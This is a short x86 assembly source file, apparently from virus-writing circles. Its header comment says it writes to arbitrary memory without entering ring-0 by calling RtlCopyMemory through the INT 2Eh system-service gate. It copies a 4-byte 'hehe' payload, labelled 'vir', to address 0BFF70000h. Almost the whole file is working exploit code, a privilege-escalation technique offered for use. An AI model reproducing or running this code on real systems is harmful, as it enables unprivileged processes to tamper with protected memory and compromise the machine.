
; ACTION: access any memory without entering ring-0 (via INT 2E)

include                 ntoskrnl.inc

callW                   macro   x
                        extern  x:proc
                        call    x
                        endm

                        p386
                        model   flat

                        locals  __

                        .data

stk:                    dd      0BFF70000h      ; edi (destination)
                        dd      offset vir      ; esi (source)
                        dd      4               ; ecx (length in bytes)

vir:                    db      'hehe'

                        .code
start:

                        mov     eax, i2E_RtlCopyMemory
                        lea     edx, stk
                        int     2Eh

                        push    -1
                        callW   ExitProcess

                        end     start
